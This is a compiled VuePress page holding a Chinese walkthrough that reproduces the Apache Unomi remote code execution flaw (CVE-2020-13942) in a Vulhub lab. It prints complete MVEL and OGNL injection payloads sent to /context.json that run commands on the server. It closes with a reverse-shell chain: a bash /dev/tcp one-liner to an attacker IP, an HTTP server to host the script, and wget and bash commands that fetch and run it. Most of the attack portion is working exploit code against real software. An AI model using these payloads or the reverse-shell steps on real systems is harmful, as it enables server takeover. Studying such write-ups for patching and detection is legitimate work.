import{_ as a}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o as l,c as d,a as e,b as i,d as t,e as o}from"./app-58e4a7d6.js";const r={},u=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),i(" 漏洞描述")],-1),c=e("p",null,"Apache Unomi 是一个基于标准的客户数据平台（CDP，Customer Data Platform），用于管理在线客户和访客等信息，以提供符合访客隐私规则的个性化体验。在Apache Unomi 1.5.1级以前版本中，存在一处表达式注入漏洞，远程攻击者通过MVEL和OGNL表达式即可在目标服务器上执行任意命令。",-1),v=e("p",null,"参考链接：",-1),m={href:"https://www.checkmarx.com/blog/apache-unomi-cve-2020-13942-rce-vulnerabilities-discovered/",target:"_blank",rel:"noopener noreferrer"},p={href:"https://github.com/eugenebmx/CVE-2020-13942",target:"_blank",rel:"noopener noreferrer"},b=o(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub运行如下命令启动一个Apache Unomi 1.5.1的服务器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，通过<code>http://your-ip:8181</code>或<code>https://your-ip:9443</code>即可访问到Unomi的API。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021621659.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>通过8181和9443两个端口均可触发漏洞，以下以9443为例。</p><p>通过MVEL表达式执行任意命令，例如：<code>touch /tmp/awesome_poc</code></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /context.json HTTP/1.1
Host: your-ip:9443
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 483

{
    &quot;filters&quot;: [
        {
            &quot;id&quot;: &quot;sample&quot;,
            &quot;filters&quot;: [
                {
                    &quot;condition&quot;: {
                         &quot;parameterValues&quot;: {
                            &quot;&quot;: &quot;script::Runtime r = Runtime.getRuntime(); r.exec(\\&quot;touch /tmp/mvel\\&quot;);&quot;
                        },
                        &quot;type&quot;: &quot;profilePropertyCondition&quot;
                    }
                }
            ]
        }
    ],
    &quot;sessionId&quot;: &quot;sample&quot;
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021623415.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>通过OGNL表达式执行任意命令：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /context.json HTTP/1.1
Host: your-ip:9443
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 1064

{
  &quot;personalizations&quot;:[
    {
      &quot;id&quot;:&quot;gender-test&quot;,
      &quot;strategy&quot;:&quot;matching-first&quot;,
      &quot;strategyOptions&quot;:{
        &quot;fallback&quot;:&quot;var2&quot;
      },
      &quot;contents&quot;:[
        {
          &quot;filters&quot;:[
            {
              &quot;condition&quot;:{
                &quot;parameterValues&quot;:{
                  &quot;propertyName&quot;:&quot;(#runtimeclass = #this.getClass().forName(\\&quot;java.lang.Runtime\\&quot;)).(#getruntimemethod = #runtimeclass.getDeclaredMethods().{^ #this.name.equals(\\&quot;getRuntime\\&quot;)}[0]).(#rtobj = #getruntimemethod.invoke(null,null)).(#execmethod = #runtimeclass.getDeclaredMethods().{? #this.name.equals(\\&quot;exec\\&quot;)}.{? #this.getParameters()[0].getType().getName().equals(\\&quot;java.lang.String\\&quot;)}.{? #this.getParameters().length &lt; 2}[0]).(#execmethod.invoke(#rtobj,\\&quot;touch /tmp/ognl\\&quot;))&quot;,
                  &quot;comparisonOperator&quot;:&quot;equals&quot;,
                  &quot;propertyValue&quot;:&quot;male&quot;
                },
                &quot;type&quot;:&quot;profilePropertyCondition&quot;
              }
            }
          ]
        }
      ]
    }
  ],
  &quot;sessionId&quot;:&quot;sample&quot;
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021625450.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>进入容器，可见命令已执行成功：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021625913.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h3 id="反弹shell" tabindex="-1"><a class="header-anchor" href="#反弹shell" aria-hidden="true">#</a> 反弹shell</h3><p>通过OGNL表达式执行任意命令，反弹shell。</p><p>编写shell脚本并启动http服务器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.174.128/9999 0&gt;&amp;1&quot; &gt; shell.sh
python3环境下：python -m http.server 80
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>上传shell.sh文件的命令为：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>wget 192.168.174.128/shell.sh
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>执行shell.sh文件的命令为：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>bash shell.sh
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>成功接收反弹shell：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203021627471.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,25);function h(g,q){const n=s("ExternalLinkIcon");return l(),d("div",null,[u,c,v,e("ul",null,[e("li",null,[e("a",m,[i("https://www.checkmarx.com/blog/apache-unomi-cve-2020-13942-rce-vulnerabilities-discovered/"),t(n)])]),e("li",null,[e("a",p,[i("https://github.com/eugenebmx/CVE-2020-13942"),t(n)])])]),b])}const _=a(r,[["render",h],["__file","Apache Unomi 远程表达式代码执行漏洞 CVE-2020-13942.html.vue"]]);export{_ as default};
